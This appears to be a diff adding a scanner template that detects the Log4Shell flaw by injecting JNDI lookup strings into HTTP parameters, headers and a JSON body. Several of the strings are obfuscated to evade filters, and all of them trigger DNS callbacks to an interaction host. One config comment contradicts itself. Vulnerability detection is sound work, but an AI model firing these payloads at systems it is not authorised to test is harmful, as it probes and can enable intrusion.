@@ -1,0 +1,65 @@
+id: log4shell-subdomain-scanner
+
+info:
+  name: Apache Log4j Log4Shell Vulnerability Detection
+  author: grok-based-on-intigriti-article
+  severity: critical
+  description: |
+    Detects potential Log4Shell (CVE-2021-44228) vulnerabilities in web services by injecting obfuscated JNDI payloads into various HTTP components and checking for DNS interactions via Interactsh.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-917
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+  tags: cve,cve2021,log4j,log4shell,rce,oob,network
+
+variables:
+  rand: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        GET /?utm_source=${jndi:dns://{{interactsh-url}}/{{rand}}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${jndi:dns://{{interactsh-url}}/{{rand}}}
+        Referer: ${jndi:dns://{{interactsh-url}}/{{rand}}}
+        X-Forwarded-For: ${jndi:dns://{{interactsh-url}}/{{rand}}}
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${${lower:j}ndi:${lower:d}ns://{{interactsh-url}}/{{rand}}}
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://{{interactsh-url}}/{{rand}}}
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${j${lower:n}di:d${lower:n}s://{{interactsh-url}}/{{rand}}}
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${${env:EMPTY:-j}ndi:${env:EMPTY:-d}ns://{{interactsh-url}}/{{rand}}}
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 50
+
+        {"test": "${jndi:dns://{{interactsh-url}}/{{rand}}}"}
+    max-requests: 1  # To avoid overwhelming, but since multiple raw, it will send all
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: dsl
+        dsl:
+          - 'contains(interactsh_request, "{{rand}}")'
